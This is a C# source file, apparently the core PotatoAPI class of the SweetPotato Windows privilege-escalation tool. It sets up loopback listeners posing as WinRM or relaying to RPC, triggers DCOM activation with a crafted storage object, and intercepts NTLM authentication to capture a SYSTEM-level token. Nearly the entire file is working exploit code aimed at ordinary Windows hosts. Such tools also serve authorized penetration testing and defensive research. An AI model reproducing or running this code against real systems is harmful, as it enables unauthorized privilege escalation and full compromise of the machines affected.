using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace SweetPotato {

    public enum ExecutionMethod {
        Auto,
        Token,
        User
    }

    public class PotatoAPI {

        Thread comListener;
        Thread winRMListener;
        LocalNegotiator negotiator = new LocalNegotiator();
        Guid clsId;
        readonly int port;
        bool fakeWinRM;
        volatile bool dcomComplete = false;


        public IntPtr Token {
            get {
                return negotiator.Token;
            }
        }

        EventWaitHandle readyEvent = new EventWaitHandle(false, EventResetMode.AutoReset);

        public PotatoAPI(Guid clsId, ushort port, bool fakeWinRM) {
            this.clsId = clsId;
            this.port = port;
            this.fakeWinRM = fakeWinRM;

            if (fakeWinRM)
                StartWinRMThread();
            else
                StartCOMListenerThread();            
        }

        public Thread StartWinRMThread() {
            winRMListener = new Thread(WinRMListener);
            winRMListener.Start();
            return winRMListener;
        }

        public Thread StartCOMListenerThread() {
            comListener = new Thread(COMListener);
            comListener.Start();
            return comListener;
        }

        string GetAuthorizationHeader(Socket socket) {

            byte[] buffer = new byte[4096];
            int len = socket.Receive(buffer);

            string authRequest = Encoding.ASCII.GetString(buffer);

            Regex rx = new Regex(@"Authorization: Negotiate (?<neg>.*)");
            MatchCollection matches = rx.Matches(authRequest);

            if(matches.Count == 0) {
                return null;
            }

            return matches[0].Groups["neg"].Value;
        }

        void WinRMListener() {

            Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            listenSocket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, 1);

            listenSocket.Bind(new IPEndPoint(IPAddress.Loopback, 5985));
            listenSocket.Listen(10);
            readyEvent.Set();

            while (!listenSocket.Poll(100000, SelectMode.SelectRead)) {
                if (dcomComplete)
                    return;
            }

            Socket clientSocket = listenSocket.Accept();

            string authHeader = GetAuthorizationHeader(clientSocket);
            negotiator.HandleType1(Convert.FromBase64String(authHeader));
            
            string challengeResponse = String.Format(
                "HTTP/1.1 401 Unauthorized\n" +
                "WWW-Authenticate: Negotiate {0}\n" +
                "Content-Length: 0\n" +
                "Connection: Keep-Alive\n\n",
                Convert.ToBase64String(negotiator.Challenge)
                ); 

            clientSocket.Send(Encoding.ASCII.GetBytes(challengeResponse));
            authHeader = GetAuthorizationHeader(clientSocket);

            negotiator.HandleType3(Convert.FromBase64String(authHeader));

            clientSocket.Close();
            listenSocket.Close();
        }

        void COMListener() {

            try {
                Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                listenSocket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, 1);

                listenSocket.Bind(new IPEndPoint(IPAddress.Loopback, port));
                listenSocket.Listen(10);
                readyEvent.Set();

                while (!listenSocket.Poll(100000, SelectMode.SelectRead)) {
                    if (dcomComplete)
                        return;
                }

                Socket clientSocket = listenSocket.Accept();
                Socket rpcSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                rpcSocket.Connect(new IPEndPoint(IPAddress.Loopback, 135));

                byte[] buffer = new byte[4096];
                int recvLen = 0;
                int sendLen = 0;

                while ((recvLen = clientSocket.Receive(buffer)) > 0) {
                    byte[] received = new byte[recvLen];
                    Array.Copy(buffer, received, received.Length);

                    ProcessNTLMBytes(received);

                    if (negotiator.Authenticated) {
                        break;
                    }

                    sendLen = rpcSocket.Send(received);
                    recvLen = rpcSocket.Receive(buffer);

                    if (recvLen == 0) {
                        break;
                    }

                    received = new byte[recvLen];
                    Array.Copy(buffer, received, received.Length);

                    ProcessNTLMBytes(received);
                    sendLen = clientSocket.Send(received);

                    if (listenSocket.Poll(100000, SelectMode.SelectRead)) {
                        clientSocket.Close();
                        clientSocket = listenSocket.Accept();
                        rpcSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        rpcSocket.Connect(new IPEndPoint(IPAddress.Loopback, 135));
                    }
                }

                try {
                    clientSocket.Close();
                    rpcSocket.Close();
                    listenSocket.Close();
                } finally { }
                                   
            } catch (Exception e) {
                Console.WriteLine("[!] COM Listener thread failed: {0}", e.Message);
                readyEvent.Set();
            }
        }

        public bool TriggerDCOM() {

            int result = 0;

            try {

                if (!fakeWinRM) {
                    result = Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);
                    result = Ole32.StgCreateDocfileOnILockBytes(lockBytes, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out IStorage storage);
                    StorageTrigger storageTrigger = new StorageTrigger(storage, string.Format("127.0.0.1[{0}]", port), TowerProtocol.EPM_PROTOCOL_TCP);

                    Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];
                    qis[0].pIID = Ole32.IID_IUnknownPtr;

                    result = Ole32.CoGetInstanceFromIStorage(null, ref clsId, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);
                } else {

                    Type comType = Type.GetTypeFromCLSID(clsId);
                    var instance = Activator.CreateInstance(comType);
                }
                 
            } catch (Exception e) {
                if (!negotiator.Authenticated)
                    Console.Write(String.Format("{0}\n", e.Message));
            }

            dcomComplete = true;
            return negotiator.Authenticated;
        }

        int FindNTLMBytes(byte[] bytes) {
            //Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
            //The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
            //we can just return the index
            byte[] pattern = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
            int pIdx = 0;
            int i;
            for (i = 0; i < bytes.Length; i++) {
                if (bytes[i] == pattern[pIdx]) {
                    pIdx = pIdx + 1;
                    if (pIdx == 7) return (i - 6);
                } else {
                    pIdx = 0;
                }
            }
            return -1;
        }

        int ProcessNTLMBytes(byte[] bytes) {

            int ntlmLoc = FindNTLMBytes(bytes);
            if (ntlmLoc == -1) return -1;

            byte[] ntlm = new byte[bytes.Length - ntlmLoc];
            Array.Copy(bytes, ntlmLoc, ntlm, 0, ntlm.Length);

            int messageType = bytes[ntlmLoc + 8];
            switch (messageType) {
                case 1:
                    //NTLM type 1 message
                    return negotiator.HandleType1(ntlm);
                case 2:
                    //NTLM type 2 message
                    int result = negotiator.HandleType2(ntlm);
                    Array.Copy(ntlm, 0, bytes, ntlmLoc, ntlm.Length);
                    return result;

                case 3:
                    //NTLM type 3 message
                    return negotiator.HandleType3(ntlm);
                default:
                    Console.WriteLine("Error - Unknown NTLM message type...");
                    return -1;
            }
        }
    }
}
